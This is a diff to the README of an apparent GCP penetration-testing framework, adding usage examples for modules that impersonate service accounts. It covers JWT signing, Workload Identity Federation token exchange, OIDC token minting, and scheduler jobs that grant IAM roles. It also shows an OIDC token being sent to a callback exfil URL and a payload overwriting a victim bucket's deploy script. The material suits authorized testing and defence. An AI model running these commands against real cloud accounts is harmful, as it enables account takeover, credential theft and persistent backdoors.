@@ -310,6 +310,11 @@ These exploits require only **one key permission** to reach a target SA identity
 modules run exploit_generate_access_token \
   --target-sa projects/PROJECT_ID/serviceAccounts/TARGET_SA_EMAIL
 
+# Sign a JWT as the target SA and exchange it for a full OAuth2 access token
+# (requires iam.serviceAccounts.signJwt or signBlob on the target)
+modules run exploit_sign_jwt_as_sa \
+  --target-sa TARGET_SA_EMAIL
+
 # Create a long-lived SA JSON key (no expiry — persists indefinitely)
 # (requires iam.serviceAccountKeys.create on the target)
 modules run exploit_service_account_keys \
@@ -326,9 +331,13 @@ modules run exploit_gcp_setiampolicy \
   --role roles/owner
 ```
 
-### Multi-Permission Movement — Arbitrary GCP API SA Calls
+### Multi-Permission Movement
 
-These services let you schedule HTTP requests authenticated as a target SA, turning service-management permissions (`cloudscheduler.jobs.create` / `cloudtasks.tasks.create`) + `iam.serviceAccounts.actAs` into arbitrary `googleapis.com` API calls on the SA's behalf.
+These paths require two or more permissions. Two sub-patterns depending on what you get back:
+
+#### Calling APIs as the Target SA
+
+The service makes API calls authenticated as the target SA — you control what is called but never receive the token itself. Side-effect mutations only (IAM grants, key operations, etc.).
 
 ```bash
 # Create a Cloud Scheduler job that calls setIamPolicy as a privileged SA
@@ -339,7 +348,7 @@ modules run exploit_cloudscheduler_job \
   --read-response \
   --cleanup
 
-# Create a Cloud Tasks HTTP task authenticated as a target SA (oauthToken or oidcToken)
+# Create a Cloud Tasks HTTP task authenticated as a target SA
 # (requires cloudtasks.tasks.create + iam.serviceAccounts.actAs on TARGET_SA)
 modules run exploit_cloudtasks_task_as_sa \
   --target-sa TARGET_SA_EMAIL \
@@ -350,16 +359,46 @@ modules run exploit_cloudtasks_task_as_sa \
 
 > **Note:** Response bodies are never returned by Cloud Scheduler or Cloud Tasks. Only side-effect mutations (IAM grants, key enables, etc.) are viable. To receive a token, use [OIDC Access](#exploit-module-tldr-oidc-access) paths below.
 
-### OIDC Access
+#### Getting an OAuth2 Token Directly
 
-These paths deliver a **Google-signed OIDC JWT** proving the target SA's identity to an attacker-controlled HTTPS endpoint. The OIDC token is not a `ya29.*` OAuth2 access token — use it for Cloud Run/IAP authentication, cross-cloud WIF exchange, or proving SA identity to third-party APIs.
+Set up Workload Identity Federation to exchange any trusted external identity token for a full OAuth2 access token for the target SA. The token comes back to you — no side-effect-only limitation.
 
 ```bash
+# Setup: create WIF pool + provider + IAM binding on the target SA
+# (requires iam.workloadIdentityPools.create + workloadIdentityPoolProviders.create
+#  + iam.serviceAccounts.setIamPolicy on TARGET_SA)
+modules run exploit_wif_impersonation \
+  --mode setup \
+  --target-sa TARGET_SA_EMAIL \
+  --provider-type google \
+  --restrict-to-caller
+
+# Exchange: swap an external OIDC token for TARGET_SA's OAuth2 access token
+# (no extra permissions needed — works against any existing WIF pool/provider)
+modules run exploit_wif_impersonation \
+  --mode exchange \
+  --target-sa TARGET_SA_EMAIL \
+  --pool-id POOL_ID \
+  --provider-id PROVIDER_ID \
+  --external-token OIDC_TOKEN \
+  --save-as-cred TARGET_SA_CRED
+```
+
+### OIDC Access
+
+These paths deliver a **Google-signed OIDC identity token** for the target SA — not an OAuth2 access token. Use for Cloud Run/IAP authentication, WIF exchange, or proving SA identity to third-party APIs.
+
+```bash
+# Mint an OIDC identity token directly for a target SA
+# (requires iam.serviceAccounts.getOpenIdToken on the target)
+modules run exploit_get_oidc_token \
+  --target-sa TARGET_SA_EMAIL \
+  --audience https://TARGET_CLOUD_RUN_URL
+
 # Create an API Gateway with TARGET_SA as the service account;
 # ESPv2 delivers a Google-signed OIDC JWT to your callback URL on every request
 # (requires apigateway.apiconfigs.create + apigateway.gateways.create/update
-#  + iam.serviceAccounts.actAs on TARGET_SA;
-#  minimal path: apiconfigs.create + gateways.update only)
+#  + iam.serviceAccounts.actAs on TARGET_SA)
 modules run exploit_apigateway_as_sa_oidc \
   --target-sa TARGET_SA_EMAIL \
   --exfil-url https://BURP_COLLABORATOR_HOST/apigw \
@@ -410,7 +449,7 @@ These modules exploit write access to GCS or the ability to create persistent HM
 # (requires storage.objects.create on the target bucket)
 modules run exploit_bucket_upload \
   --bucket victim-configs \
-  --remote-blob-path deploy/startup.sh \
+  --remote-blob-path deploy/deploy.sh \
   --local-blob-path ./payload.sh
 
 # Create an HMAC key tied to a target SA — long-lived, S3-compatible,
